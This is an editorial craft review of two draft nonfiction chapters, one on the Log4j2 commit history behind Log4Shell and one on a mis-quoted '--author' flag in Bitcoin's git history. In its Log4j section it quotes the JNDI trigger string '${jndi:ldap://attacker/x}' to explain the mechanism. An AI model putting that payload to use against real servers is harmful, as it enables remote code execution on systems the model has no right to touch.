# Craft review: “The verb that arrived late” and “A flag with 8 commits”

Two chapters, one job. Chapter 02 is the book’s thesis chapter — no villain, competent people, compounding — and it currently *argues* that thesis in paragraph one, then walks five exhibits that confirm it. Chapter 03 is the right kind of third chapter, a lower-stakes rhyme, and it currently *announces* that it is the smallest story in the book. Both already sound like the narrator who wrote “The nine minutes.” Neither yet uses the trick that chapter made policy: enter concrete, withhold the moral, isolate the beat, let the leftover become the habit.

This is a craft review, not a fact check. Hashes, dates, commands, and quoted output are locked. I am not touching them. Word counts are body only, as TEMPLATE.md measures them: chapter 02 is 1,715; chapter 03 is 1,066; the band is 2,200–3,200. Chapter 01, post-rewrite, sits at 2,073 and was allowed to live near the floor because the minutes were inhabited. These two have different problems. 02 is under because the rooms are thin. 03 is under because the story is actually small, and chasing the band would be a mistake.

Three sentences in 02 and three in 03 are already keepers for the series. I will name them. The rest of this review is about getting the reader to them without being told they are coming.

---

# Chapter 02 — Log4j2 (1,715 words)

The bones are the right bones: five ordinary commits, eleven years, the interpolator, the colon, the kill switch left off, a cleanup that never says “security,” a test class named `JndiExploit`. The voice is already the book’s voice when it is looking at a diff. The problem is the frame. You tell us there is no villain, then you prove it. CONTEXT.md exists because the earlier shelf had no surprise. This draft has a thesis instead of a spoiler, which is the same shape in a nicer coat.

## 1. Structure and pacing

### The open dumps the thesis, then issues a guided tour

Sentence one names Log4Shell. Sentence two tells us the popular version is wrong. Sentence three gives us the count, the span, the approval-test, and the coral reef:

> There is a version of the Log4Shell story where someone is careless. It is the version most people tell, and it is wrong. What `git` holds instead is worse and more useful: five commits, spread across eleven years, each of them the sort of thing you would approve without a second thought. Nobody was careless. The vulnerability was assembled the way a coral reef is — one reasonable deposit at a time — and the log records every reasonable person who added to it.

That is the jacket copy, the table of contents, and the last page. A reader who already knows CVE-2021-44228 settles in for a well-written recap. A reader who doesn’t has nothing left to feel a beat before it is named, because you have named the moral, the structure, and the metaphor. Then you clone and promise to “walk the whole chain in order,” which is the voice of a museum docent. Chapter 01, after the rewrite, enters on a Tuesday clock and a file. This enters on an argument with folklore.

The coral reef is a good image. It is in the wrong room. Save it until the reader has seen three deposits and is reaching for a metaphor themselves. If you still need to say it, say it once, after 2013, or in At home, not as the contract of paragraph one.

**Move:** strip Log4Shell, “careless,” “five commits,” “eleven years,” and the reef from the open. Enter on a concrete object — the 2010 convenience, or the 2012 subject line — and clone in one sentence. Do not say the vocabulary is about to spring a leak. Do not say you are about to walk a chain.

### The year headings flatten the accretion into a timeline

`2010`, `2012`, `2013`, `2016`, `2021`, `The fire`, `At home`. After chapter 01’s story-objects (“What Kurt knew,” “Two calls,” “The dead path,” “The name that would not die”), this is a step back toward the Wikipedia outline of Log4Shell. The years belong in the prose. The headings should be *this* story’s objects: the open list, the performance subject, the colon in the docs, the kill switch, “this feature is not used,” the test class they named.

Year-headings also impose equal dignity on unequal deposits. 2010 is setup. 2012 is the seam. 2013 is the last brick. 2016 is the thesis (they looked, and saw Camel). 2021 is the unique archaeology (the default flips, the word “security” never appears). The fire is coda. Right now they read as five exhibits and a blaze, which is how a recap is paced, not how a compounding disaster is felt.

### Does the five-commit structure drag? It does not drag. It climaxes too early.

You build to this, at the end of 2013:

> Now the pieces are all present, and no single person put them together. `${` in a message reaches the interpolator (2012). The interpolator dispatches to `jndi` (2013). `jndi` with a colon fetches a remote URL (2013). A log line reading `${jndi:ldap://attacker/x}` is now a remote code path.

That paragraph is clean, and it is a mid-chapter climax. From here the exploit exists. Then you still have 2016, 2017, 2021, and December, which the reader will experience as appendix unless you recast them. They are not appendix. They *are* the thesis. The compounding that matters is not “JNDI got added.” It is: the system looked at the interpolator firing on data, classified it as a compatibility annoyance, shipped a kill switch whose default was off, and eleven days before the CVE killed the feature as unused CPU. If 2013 feels like the bomb is built, 2016–2021 cannot earn their keep no matter how good the sentences are.

**Reweight, do not add a sixth commit.** 2010 short (a language, an open list, trusted input — stop). 2012 long (the room, the ternary, the isolated beat). 2013 the colon as a photograph, then the assembly paragraph *without* “it will stay that way for eight years while everyone looks straight at it” — that line prosecutes, and it makes 2016 feel like evidence of looking-away rather than looking-at-the-wrong-thing. 2016–2017 one movement: they saw it, from the inside, as Camel and cycles. 2021 the timestamps and the quote. Fire as leftover: `JndiExploit`, then the FQCN callback to the open list, then the 2014 TODO riding until 2022. That leftover should run into At home the way `valgrind.patch` does in chapter 01. Do not put a lecture between them.

### You announce every turn

Chapter 01’s rule, already applied: isolate the beat; do not wind up. This draft winds up constantly.

> Here is the pivot, and it is worth slowing down for, because it is the least suspicious commit in the entire chain and it is the one that turns a config feature into an attack surface.

That is “And then the best part, the part that is pure `git`” in a new suit. Cut it. September 2012, Ralph again, the subject line. Let “to improve performance” sit. Let the ternary sit. Let the reader feel the message is application data a sentence before you say so.

> The first line adds the verb. The second is from the *documentation*, checked in with the same commit, and it is the whole disaster in one sentence.

Cut from the comma. The doc line is the photograph. “Whole disaster in one sentence” is the narrator grabbing the reader’s wrist.

> That is the whole safety argument, and it is about to spring a slow leak.

The second clause is a trailer. Period after “argument.”

> The commits from that week are the only part of this story anyone remembers, so I will show you the one detail that is not in the postmortems.

Same elbow as chapter 01’s old “no CVE writeup will tell you.” Cut the wind-up. Start on Saturday night and the test class. The name `JndiExploit` is the detail. It does not need a drumroll.

The one announcement I would keep, because it is a heading-quality sentence and not a spoiler of mechanism:

> The most painful part of the record is that Log4j *saw* it. Not as a security hole — as a bug report about the wrong thing.

That is the thesis as a scene, not as a preface. It belongs on 2016, and it is currently the best sentence in a section that is otherwise a little brisk for how much work it has to do.

### Does the thesis land?

It is clear. It does not yet land.

Clear: a competent reader can close the tab and write “no villain, five commits, compounding” on an exam. You said it in the open, you restated it at the 2013 assembly, you restated it in At home (“four authors, eight years, no villain”). The intellectual thesis is not at risk.

Land: the reader should think, at least three times, *I would have approved that*. Right now they think *ah, another reasonable deposit*, which is a plot point the open already billed. Compare chapter 01: we sit in Kurt’s queue, we see two calls that look alike, we feel the DRY instinct, *then* “He has disabled the seeding.” Here we get “It is a feature every logging framework has,” “A performance refactor,” “JNDI is a perfectly reasonable enterprise feature,” each as a label on an exhibit. The labels are correct. They are not rooms.

Two places already do the thing, and they are why the chapter is salvageable rather than a recap:

1. 2012, after the ternary — username, User-Agent, search query, header. Then: “Ralph is optimizing a layout.” That is the moment-before. Protect it. Slow it. Stop saying “attack surface” before we get there.
2. 2021 — “Whether Carter is quietly acting on the private report or independently killing a misfeature the same week, the commit does the correct thing for a reason adjacent to the truth.” That sentence is the book. No sneering, no hindsight-flattering, the actor’s Tuesday reconstructed as far as the log will take us and not one inch further. Give it air.

What undercuts the thesis, and should be cut or aimed at the record not the people:

> It has been, since this Thursday afternoon, and it will stay that way for eight years while everyone looks straight at it.

“Looks straight at it” implies they should have seen a hole. The 2016 section exists to show they saw a *Camel bug*. Do not prosecute 2013 with a charge 2016 will dismiss.

The ear will also do math you did not ask for. Open: eleven years. Close: “four authors, eight years, no villain.” I am not litigating which span is which. I am saying the collision is the same one chapter 01 had with six months and twenty months. Pick one duration for the compounding, and if you need a second number (years the exploit was live, years the TODO sat), make it obviously a different quantity.

### First person is almost missing

Chapter 01: “I go looking for it in the Debian *packaging* repository.” This chapter has “so I will show you the one detail,” which is the wrong I, and a clone in the imperative. The narrator who runs `blame` daily should appear at the clone and at the 2021 timestamps — the thing *you* noticed, standing in the log — and then get out of the way. Do not add memoir. Add one pair of hands on the repo.

## 2. Prose

### Sentences to rewrite

**1.** (open — thesis, count, reef)

> There is a version of the Log4Shell story where someone is careless. It is the version most people tell, and it is wrong.

Rewrite: delete. Do not replace with a softer version of the same argument. Enter on the object.

If 2010 is the open:

> In October 2010, Ralph Goers adds variable substitution to Log4j 2: write `${sys:user.name}` in a config file and it resolves at runtime. Every logging framework has this.

Then the open list, trusted input, stop. Clone. No leak, no Log4Shell, no five.

If 2012 is the open (different object from chapter 01’s clock, and it is the seam):

> September 2012. The subject line says it is to improve performance.

Then the `git show --format='%s'`. Do not call it a pivot.

**2.** (2010, trailer)

> That is the whole safety argument, and it is about to spring a slow leak.

Rewrite: “That is the whole safety argument.”

**3.** (2012, announced turn)

> Here is the pivot, and it is worth slowing down for, because it is the least suspicious commit in the entire chain and it is the one that turns a config feature into an attack surface.

Rewrite: nothing. Go to “September 2012, Ralph again.”

**4.** (2013, wrist-grab)

> The first line adds the verb. The second is from the *documentation*, checked in with the same commit, and it is the whole disaster in one sentence.

Rewrite: “The first line adds the verb. The second is from the documentation, checked in with the same commit.”

Then the colon. Then a one-line beat, not a tour-guide gloss:

> `ldap:` contains a colon.

**5.** (2013, prosecutorial)

> It has been, since this Thursday afternoon, and it will stay that way for eight years while everyone looks straight at it.

Rewrite: “It has been, since this Thursday afternoon. It will stay that way for eight years.”

**6.** (2016, tense and jacket)

> The mitigation that the entire internet will scramble to apply in December 2021 — `log4j.formatMsgNoLookups=true` — has been sitting in the jar, one boolean away, since 2017.

The scramble is folklore-stakes in a section that should stay inside the ticket. You can keep the jar. Drop the internet.

Rewrite: “`log4j.formatMsgNoLookups=true` has been sitting in the jar, one boolean away, since 2017.”

Then your isolated beat, which is already perfect:

> An off switch whose default is on is not a mitigation. It is a comment.

Give that whitespace on both sides. It is this chapter’s “He has disabled the seeding.”

**7.** (fire, drumroll)

> On December 9 the disclosure is public and the internet is on fire. The commits from that week are the only part of this story anyone remembers, so I will show you the one detail that is not in the postmortems.

Rewrite: “Saturday, December 4, 21:00 Colorado time, Ralph checks in the first defensive patch. In the same commit, a new test class:”

Then the diff. Then isolate:

> They named it `JndiExploit`.

**8.** (At home, restates the open)

> The lesson of Log4Shell is not "don't be careless." Every commit in the chain was competent. The lesson is that a system acquires a vulnerability the way it acquires a feature — incrementally, by people who each saw only their piece.

If the open is no longer this paragraph, you may keep a short version as the *earned* moral. If the open still says it, this is duplication and it costs the leftover its job. Lead from the 2014 TODO / FQCN instead:

> You cannot delete a verb from a language that auto-discovers its verbs. Write down, today, the list of things it must never be allowed to say.

Then the seam command. Then keep this, untouched:

> The dangerous commit almost never says danger. It says convenience, or speed, or cleanup.

### The paragraph doing the most work

This, in 2012:

> Read what that ternary does. If the formatted log message contains `${`, run the interpolator on it; otherwise, skip. The `contains("${")` is a performance guard — don't pay for substitution on messages that don't need it. [R2] But the message is the string the *application* built. It is the username someone typed, the User-Agent a browser sent, the search query, the header. As of this commit, if any of that text contains `${`, it gets handed to the little language from 2010.

It has to (a) teach the ternary, (b) make the guard feel like hygiene, (c) move the input from operator to user without sneering, (d) hand us back to 2010’s language. It does all four, which is why the next paragraph can be quiet (“Ralph is optimizing a layout”) and the beat can land. Break it after “need it.” Let “But the message is the string the *application* built” start a new paragraph. Then the list of inputs. Then a blank line. Then:

> A performance guard and an attack trigger can be the same two lines of code.

That line is a keeper for the whole series. It currently sits under “This is the sentence to keep from the whole chapter,” which is the narrator circling it in red pen. Isolate the sentence. Cut the circling.

Runner-up, and the paragraph that actually serves the *thesis* rather than the exploit:

> "This feature is not used." [R6] They grepped GitHub and Stack Overflow and found almost nobody who *wanted* message lookups. They were right. They were about to discover that everybody *had* them. Whether Carter is quietly acting on the private report or independently killing a misfeature the same week, the commit does the correct thing for a reason adjacent to the truth: it is a cleanup, it is unused, it costs cycles. The word "security" does not appear. The default flips eleven days before the CVE, in a commit about CPU.

Do not rewrite the Carter sentence. Give it a break before “The word ‘security’ does not appear,” so that last cadence can sit.

### The paragraph pulling its weight least

The opening paragraph (careless / wrong / five commits / coral reef). It spends the surprise, the thesis, and the metaphor before anyone has typed.

Runner-up: At home’s first paragraph, which is the opening paragraph again, after we have earned the right not to need it.

Third: “The fire”’s wind-up sentence. The section’s actual goods — `JndiExploit`, the FQCN exclude, the 2014 TODO — are the right coda. The internet-on-fire throat-clearing is folklore the book was built to step around.

### Small voice notes

- “a little programming language” — keep. That is the 2010 object.
- “The design decision that matters is not the language. It is that the list of verbs is *open*.” — keep. Do not decorate it. This is the callback the FQCN ending will cash.
- “Whatever anyone registers later becomes a word this little language can speak, in every config file, forever.” — “forever” is a drum. “in every config file” is enough.
- “Nobody is logging attacker input into it yet, because nobody has registered a dangerous verb.” — “attacker” is a beat early. “Nobody has registered a dangerous verb” is the room. You can say the input is still boring.
- “To be helpful, `JndiLookup` prepends…” — “To be helpful” is the no-sneering rule in three words. Keep.
- “An off switch whose default is on is not a mitigation. It is a comment.” — keep, isolate.
- “They were right. They were about to discover that everybody *had* them.” — keep.
- “This feature is not used as far as we've been able to tell searching github and stackoverflow” — you quote it, then you gloss it. The gloss is earned. Do not also say they were about to be famous. The adjacency sentence does that job without gossip.
- “You cannot delete a verb from a language that auto-discovers its verbs; you have to name the specific thing and forbid it.” — keep. This is the title’s real payoff, and it is currently stronger than the title.
- `[R1]` through `[R9]` in the body: same note as chapter 01. The trailing Receipts list is the right place. Quiet them or end-of-paragraph them. Do not make a first-time reader step over **[R2]** to get from the guard to the message.

## 3. Expansion

1,715 against a 2,200–3,200 band. This is the chapter that should sit in the band. You have ~500–900 words of headroom, and you should spend them. Not on a history of Log4Shell. Not on LDAP class-loading. Not on how many servers. Not on Alibaba beyond the timestamp you already have. Add in four places. The five-commit spine should get *rooms*, not more exhibits.

### A. Sit in 2012 (after the subject line, before “attack surface”)

Right now: subject, two-line diff, “Read what that ternary does,” inputs, “Ralph is optimizing a layout.”

Add a short paragraph that is *only* what Ralph is trying to save. Substitution used to run over the layout pattern — the operator’s template, paid once. After the move it is tempting to run it on every formatted message, which is a lot of messages, which is why `contains("${")` exists: skip the work when the string is just a string. The instinct is not “evaluate user input.” It is “don’t pay for a feature on the hot path unless the hot path asked for it.” Stop. Do not say attack surface. The ternary paragraph says the rest.

This is the non-negotiable from CONTEXT.md (“I might have done this”) and it is how “to improve performance” becomes a title-quality subject instead of a caption.

### B. Sit in 2016 as the thesis scene, not the next deposit

You have: Camel users, messages eaten, `%m{nolookups}` opt-in, default stays on, then Carter’s JVM switch, `false`.

Add what the ticket *looks like from inside*. Someone’s log lines contain `${...}` as data — a Camel expression, a placeholder they meant to keep — and Log4j is eating it. The maintainers do the compatibility thing: an opt-in to *not* treat a message as a program. Defaults stay as they were because changing them breaks configs. That is not a missed patch. That is a project being careful in the wrong direction. Two or three sentences of that Tuesday. Then the kill switch. Then isolate “It is a comment.”

If 2013 remains the “bomb is built” climax, this section will still feel like leftover. Recasting 2016 as *they looked* is a structural change that also happens to be the expansion the thesis needs.

### C. Give 2021 the timestamps as a scene

You already have AuthorDate / CommitDate, the private-report adjacency, the quote, “this feature is not used.” This is the unique git find; it can take another 80–120 words without becoming speculation. What you must not do: decide whether Carter knew. What you can do: stand in the week. A private report around the 24th. A commit authored the 29th whose message is about confusion and CPU and a GitHub grep. A commit date of December 4, the same Saturday as `JndiExploit`. The log will not tell you if those are one story or two. The log will tell you the default flipped in a commit about cycles. Stay there. The adjacency sentence already knows how.

### D. Fuse the leftover with the habit (end of fire → At home)

The 2014 `// TODO: this ought to use the PluginManager`, still sitting when the fire started, only resolved in January 2022, is this chapter’s `valgrind.patch`. It is currently the last clause of The fire. The FQCN exclude is the same thought: the open list from 2010 will re-register the verb unless you name it and forbid it. Walk from that leftover to “write down the list of things it must never say” to `git log -S 'contains("${")'`. Cut At home’s first paragraph (the thesis recap). Keep “The dangerous commit almost never says danger.” Keep the seam command. Keep “Read the ones that move where a string gets evaluated.”

Do not expand The fire’s protocol-limiting / 2.15-narrowed-not-closed beat. That is CVE timeline. One sentence is enough so `JndiExploit` does not look like a successful containment.

### What not to add

- A recap of how JNDI/LDAP RCE works. The colon and the remote URL are enough. The reader of this book can feel “fetches a remote URL from a log line” without a classpath lecture.
- Blast-radius statistics. “The internet is on fire” is the folklore. This chapter’s blast radius is *time* (eight years in the log) and *invisibility* (the kill switch already in the jar). You already have both.
- More authors, more commits, the rest of the December patch series. Five deposits plus a leftover is the shape. A sixth is a museum.

Target after expansion: roughly 2,400–2,700. In the band, not at the cap. If you hit 3,000 you have added folklore.

## 4. Open and close

### Cold open — not yet the strongest entry

What works in the current open: the clone URL, the promise of order. What fails: sentence one is the CVE’s name, and the rest is the moral.

Chapter 01 opens on a clock. TEMPLATE.md: no two consecutive chapters open on the same kind of object. So do not open 02 on a Tuesday timestamp. Open on a convenience, a subject line, or a quote.

Strongest version, same spine: 2010 as a small language, trusted input, open list. The reader who knows Log4Shell is waiting; let them wait. The reader who doesn’t is learning why a config file is a vocabulary. The word Log4Shell can wait until The fire, or until At home, where it will land as a delayed charge instead of a chapter label.

Second-best: the 2012 subject line as the first object, then a flash back to 2010 to explain what got moved. That is a more sophisticated structure and a more awkward order. I would not do it unless you retitle to the subject line.

Do not open on December 9. Do not open on `${jndi:ldap://...}`. Those are the folklore’s cold opens.

### At home — the habit is right; the first paragraph is a recap

The transferable command is the right one:

> `git log -S 'contains("${")'` finds the 2012 pivot in one shot; it is the moment data started being treated as code, and its message says "performance."

Keep it. Keep “Read the ones that move where a string gets evaluated, not just the ones that add a new way to evaluate it.” Keep the last sentence about writing down the verbs.

What does not earn: restating “don’t be careless” / coral-adjacent compounding after the leftover has already said it in objects. What does not earn: “four authors, eight years, no villain” as a scoreboard. If those numbers stay, they stay once, and not as the closer.

Stronger close:

1. Last story image: 2.16 cannot delete a verb; it has to forbid a fully-qualified name because of 2010. The 2014 TODO is still sitting there.
2. One woven paragraph: so when you inherit a codebase, grep the *seam* — the commit that connected two safe things. `git log -S` on the guard, not on the CVE. The dangerous commit says performance.
3. Last line, keep: “The dangerous commit almost never says danger. It says convenience, or speed, or cleanup.” Or the verbs sentence, if that is the leftover’s real child. Do not keep both at equal volume; pick the one that grew out of the last image.

## 5. Title

**“The verb that arrived late” is the second-best title, and it quietly fights the thesis.**

It is literary, it is not folklore, it is not “Log4Shell.” Good. But it centers 2013 — the JNDI deposit — which is the one object in the chain that *looks* like a villain if you squint. “If only they had not added that verb” is the story you are trying to kill. A title about a late verb invites it back. The chapter’s own spine says 2012 is “the pivot,” At home greps the 2012 guard, and the last technical image is that you cannot delete a verb from an open list. The title, the announced pivot, and the leftover are three different centers.

Alternatives, in order:

1. **To improve performance** — his words, the least suspicious commit, the At home command, the isolated beat about the guard. This is the title that makes the thesis true on the cover. Best if you keep 2012 as the seam and let JNDI be a deposit, not the name of the chapter.
2. **This feature is not used** — the 2021 archaeology, the adjacency, the word “security” never appearing. Best if you decide the unique git find is the center, not the compounding. I would not. The compounding is why this is the most important chapter.
3. **The open list** — the 2010 decision, cashed at the FQCN. Drier. More reusable as a type, which may be a reason not to use it here.
4. Keep **The verb that arrived late** only if you strip the villain-shape out of it: the verb did not arrive late. It arrived on schedule for an enterprise logging framework. What arrived late was the understanding, and even that arrived as CPU. If you keep the title, the chapter has to make “late” mean the *language was already open*, not *they should have waited to add JNDI*.

I would not use “The coral reef” (too pretty, and it belongs in a sentence, not on the door), “Log4Shell” (folklore), or “The off switch nobody flips” (one deposit, and slightly prosecutorial).

---

# Chapter 03 — Bitcoin (1,066 words)

This is the right third chapter. After a key disaster and a compounding RCE, a chapter in which nobody is attacked and nothing breaks is a structural mercy, and the narrator does not change register into comedy. The object is perfect for this book: `git shortlog` prints a command-line flag as a person. The open is the strongest open of the two drafts. The problem is not tone. The problem is that you *tell us* it is the smallest story in the book, you name the reveal before the three rows have had a beat of silence, and then you slightly starve the one room that would make Gavin’s Tuesday feel like chapter 01’s nine minutes — a man trying to preserve a name.

## 1. Structure and pacing

### The shortlog is the right object. Let it speak.

> Run `git shortlog` on the Bitcoin repository, grep for the name everyone is looking for, and the answer is not one row. It is three.

Then the fence. Then you explain all three rows in the next paragraph, and you name the reveal in the same breath:

> The third has eight commits, and it is not a person. It is a command-line flag that a real, identifiable human typed by hand, sixteen years ago, and that `git` has been faithfully attributing to a contributor ever since.

The reader who can see `--author=Satoshi Nakamoto` in the table already felt it. That is the book’s method: the receipt is the reveal. Good. Then you explain too fast. Isolate “It is not a person.” Let the three glosses be three beats — SVN robot, name, flag — not one sentence with the moral stuffed in the third clause.

Different object from chapter 01’s clock and (if you take my advice) from chapter 02’s convenience. Consecutive-chapter variety is already satisfied. Do not “improve” this open by starting on Gavin, or on a clock, or on a lecture about Subversion.

### Then you grade the chapter

> This is the smallest story in the book and one of the truest. Nobody was attacked. Nothing broke. A man tried to do a respectful thing, made a shell-quoting mistake while doing it, and the mistake became a permanent part of the identity of the most scrutinized software project on earth.

“Nobody was attacked. Nothing broke.” is the palate-cleanser contract, and it can stay if it stays *after* the flag has been seen, as relief, not as a trailer. “Smallest story in the book and one of the truest” is the narrator marking his own homework. Cut it. “Most scrutinized software project on earth” is the same superlative habit we killed in chapter 01 (“worst key disaster of the decade”). You do not need to rank Bitcoin. The eight rows rank themselves.

### The handover is necessary. It is also the graft-lecture problem, smaller.

We cannot read the flag without knowing this git history is a parallel copy of an SVN life. That paragraph has to exist. It is currently a little teacherly (“To read it you have to know where you are standing”) and then it earns its keep: Gavin’s first commit is `Fix CRLF`. Keep the janitor. Cut or shrink the “which is how maintainers almost always enter” — that is a series-thesis insert in a chapter that should stay inside July 2010.

> The man who will run Bitcoin Core for the next half-decade enters as a janitor, which is how maintainers almost always enter.

Rewrite: “The man who will run Bitcoin Core for the next half-decade enters as a janitor.”

### The reveal already happened. The turn is why it is still there.

Pacing consequence: unlike chapter 02, the reader has the object on screen one. The chapter is not “what is this name?” It is “what was he trying to do, and why didn’t anyone fix it?” That is a good shape for a short chapter. Right now “The mistake” does the intention (preserve authorship — this is the room, and it is the best paragraph in the draft), shows the eight, shows `git show --format=fuller`, then immediately explains quoting, then says the correct version exists. That is a lot of landing for a reveal we already have.

Give the intention more sitting-down. Give “Eight times, over five days” its own line — the repetition is the tell that the command was reused, not that Gavin was careless eight separate ways. Give the dual history (same makefile, `s_nakamoto` on the SVN line, the flag on the git line) a breath; you already call it “the part that makes it a chapter instead of a bug report,” which is another wrist-grab, but the *find* is real. Then “Why it is still there” is the turn of *this* chapter. Isolate:

> The mistake is load-bearing now.

That is the beat. It currently sits in the middle of a long paragraph about hashes and descendants and ledgers. Let it sit. Then the standing row.

### Does the short length work?

Yes. Do not chase 2,200.

A palate-cleanser that meets the band by adding Satoshi lore, Gavin’s later career, or a tutorial on `git filter-branch` would become disaster chapter 2.5. The band is a default for a dig with blast radius. This dig’s blast radius is eight commits and a row in `shortlog`. The register is right *because* the length is short. 1,066 is a little starved, not a little sleek: the room (Gavin at the keyboard, preserving a name) is asserted in one strong paragraph and not inhabited, and the dual history is one block. That is ~250–400 words of honest addition, which would put the chapter around 1,300–1,500. Live there. If an editor later insists on the floor, this is not the chapter that should absorb the padding.

Headings: “The handover” is a story object. “The mistake” is a beat-name and slightly prosecutorial — he was preserving authorship; the shell misfiled the instruction. Call it “Eight times” or `--author=` or “The honest move.” “Why it is still there” is the question the reader has; keep it. “At home” stays; that is the series closer.

## 2. Prose

### Sentences to rewrite

**1.** (open, self-grading)

> This is the smallest story in the book and one of the truest. Nobody was attacked. Nothing broke. A man tried to do a respectful thing, made a shell-quoting mistake while doing it, and the mistake became a permanent part of the identity of the most scrutinized software project on earth.

Rewrite: “Nobody was attacked. Nothing broke.” Then the handover. If you keep the respectful-thing sentence, drop the superlative:

> A man tried to do a respectful thing, and git kept the quoting.

**2.** (handover, teacher)

> To read it you have to know where you are standing. `git clone https://github.com/bitcoin/bitcoin` does not clone the repository Satoshi Nakamoto used.

Rewrite: “`git clone https://github.com/bitcoin/bitcoin` does not clone the repository Satoshi Nakamoto used.” The first sentence is a hand on the shoulder. The second is the fact.

**3.** (the quoting, abstract)

> The shell did what shells do. Somewhere a quoting boundary landed one character off — the `--author=` was passed as *data* to be recorded rather than as an *instruction* to record something — and git, which does not judge, wrote down what it was handed.

“One character off” is a shrug, and you correctly do not invent the exact command. The em-dash clause is the actual sentence, and it is also a rhyme with chapter 02 that you should not name: there, `${` turned a string into an instruction; here, `--author=` was passed as data. Clean it so the reader can hear it.

Rewrite:

> The shell did what shells do. `--author=` went in as data, not as an instruction. Git, which does not judge, wrote down what it was handed.

Keep “git, which does not judge.” That is this book’s God.

**4.** (wrist-grab, dual history)

> And here is the part that makes it a chapter instead of a bug report: the correct version exists.

Rewrite: “The correct version exists.” Then the `s_nakamoto` show. The find does not need a label.

**5.** (At home, two lessons at equal volume)

> So when you go to preserve someone's name on their work — the honest, generous thing Gavin was doing — check what the shell actually handed to git before you commit. And when you find a strange author in an old history, do not assume it is who it says it is, or even *what* it says it is. Sometimes it is a person. Sometimes it is a flag.

The quoting check is a tip. The identity-is-the-work paragraph above it is the habit. Do not let the tip and the last line share a landing. Last line stays. Move “check what the shell actually handed to git” up into the room, as what *you* do at home when you are being Gavin, or drop it. The closer is:

> Sometimes it is a person. Sometimes it is a flag.

### The paragraph doing the most work

The intention paragraph, under “The mistake”:

> Here is what Gavin is trying to do, and it is the opposite of careless: preserve authorship. Satoshi writes a patch on the SVN side; Gavin re-applies it to the git copy and wants the commit to still say *Satoshi wrote this*, not *Gavin committed this*. Git has a switch for exactly that intention. You run:
>
> ```
> git commit --author="Satoshi Nakamoto <satoshin@gmx.com>"
> ```
>
> and git records the author as Satoshi while recording you as the committer. It is the honest move.

This is The Room. It is why the chapter does not sneer. It is why “I might have done this” is available. It is slightly short of inhabited — we do not feel five days of re-applying someone else’s patches, or the courtesy of it, or the muscle memory of a command reused from the previous afternoon — but as a contract it is the right contract. Expand *here*, not in Bitcoin atmosphere.

Runner-up: “Why it is still there,” from “Every commit’s hash is computed from its contents” through “The mistake is load-bearing now.” That is the turn. It does too much in one breath (hash, author field, descendants, Bitcoin’s security model, cosmetic typo, cheaper to leave it). Break after the descendant-hash sentence. Then: in a project whose security model *is* a chain of hashes thousands of people have copied, you do not rewrite the chain to fix a cosmetic typo. Blank line. “The mistake is load-bearing now.”

### The paragraph pulling its weight least

“This is the smallest story in the book and one of the truest…” — self-grading, superlative, and it tells us to relax before we have met Gavin. The shortlog already told us this was not a CVE. We do not need the narrator’s permission to find it small.

Runner-up: the first half of the handover (“To read it you have to know where you are standing”) before `Fix CRLF`. Necessary facts, slightly in the voice of a preflight briefing. One tight paragraph of SVN / parallel git / mid-2010, then the janitor. Do not cut the janitor to fund a briefing.

### Small voice notes

- “the pseudonym as the version-control robot recorded it, an SVN UUID for an email” — keep. That is a lot of information in a calm voice.
- “It is the honest move.” — keep.
- “Every one of them has Gavin as the committer and the flag-that-should-have-been-a-flag as the author.” — a little label-y (“flag-that-should-have-been-a-flag”). “Gavin as the committer. The flag as the author.” Two sentences.
- “Both are checked in. Neither was ever rewritten.” — keep.
- “The most famous absent author in software has, among his commits, eight that were signed by a command-line argument, preserved by the same immutability that makes the project worth studying.” — almost the closer of the story proper. “Most famous absent author” is a magazine; “signed by a command-line argument” is the image. Lead with the image.
- “authorship, in git, is simultaneously the easiest thing in the world to fake (type any string you like into `--author`) and the hardest thing in the world to fix” — keep. That is the At home. It is also the only place this chapter should get a little loud.
- `[R1]`–`[R5]`: same quieting as 02.

## 3. Expansion

1,066 words. The band says add 1,100+. The chapter says do not. I am with the chapter.

Add in two places only. If you add a third, you are nervous about length.

### A. Five days of the honest move (in the room, after “It is the honest move”)

Right now: he typed the literal flag into the author field, eight times, over five days, and here is a log with an ellipsis.

Sit in the week. The subjects you already quote are chores and a performance idea (`tcatm's cached SHA256`, `simplified makefile.unix`). He is applying someone else’s work and refusing to take the name. The command that does that is `--author=`. He does it Monday and he does it Saturday. Eight times means the line was in his history, or in a script, or in his fingers — not that he invented a new mistake daily. You do not have the exact quoting error (locked; do not invent it). You have the pattern. The pattern is respect, repeated. One short paragraph. Then isolate “Eight times. Five days.” Then the `fuller` show, which is the photograph.

This is how the palate-cleanser stays tender instead of becoming a gotcha about shells.

### B. Dual history as two objects on the table

You have the makefile both ways. Give it one more sentence of standing there: the same change, the same day, two authors, both true in their line, neither rewritten. Do not add a diagram of the SVN import. Do not add Bitcoin politics. The disagreement about who touched the makefile *is* the blast radius of this chapter. It is already almost enough.

### What not to add

- Satoshi-identity folklore. The chapter’s joke is that one of the names is a flag. Do not reopen the other names.
- How to rewrite author fields (`filter-branch`, `rebase`, `filter-repo`). At home already says you cannot without changing everything downstream. A tutorial would sneer at the people who left it, or invite the reader to try. Either is wrong for Bitcoin, and wrong for the book.
- Gavin after 2010. The janitor is the point. The later maintainer is a different book.

If the chapter comes out around 1,400 words and someone waves TEMPLATE.md, the answer is: consecutive chapters should not all be the same length, for the same reason they should not all open on the same object. A 1,400-word third chapter after two long security digs *is* the craft.

## 4. Open and close

### Cold open — already the strongest entry of the two drafts

Keep the shortlog. Keep “the answer is not one row. It is three.” Slow the gloss after the fence. Cut “smallest / truest / most scrutinized.” Do not move the clone lecture into the first screen; the command in the open is `shortlog`, which is the right first command, because it is the command that finds the weirdness. Provenance (this is not Satoshi’s repo) waits one heading, the way chapter 01’s graft should have.

### At home — the habit is the hash, not the quoting tip

What earns: a name in git is not metadata beside the work; it *is* the work; easiest to fake, hardest to fix; both facts live in these eight commits. What half-earns: “check what the shell actually handed to git.” That is true and small. Weave it as one clause inside the honest-move memory, not as lesson one of two.

Last image of the story proper: the row still standing, cheaper than touching the ledger. Last line of the chapter: “Sometimes it is a person. Sometimes it is a flag.” Do not put a seminar between them.

## 5. Title

**Keep “A flag with 8 commits.”** It is concrete, it is not folklore, it matches the open, it does not wink as hard as `--author=Satoshi Nakamoto` would on a table of contents (that title is a punchline; this title is an object). The body uses “eight”; the title uses `8`. I would match them — “A flag with eight commits” — unless you want the title to look like `shortlog` output. Either is fine; mixing is slightly fussy.

Alternatives, if you change it: **The third row** (the open’s joke); **Load-bearing** (the turn, drier, more reusable, maybe too drier). I would not use “The janitor” (wrong center) or “The honest move” (right for a heading).

---

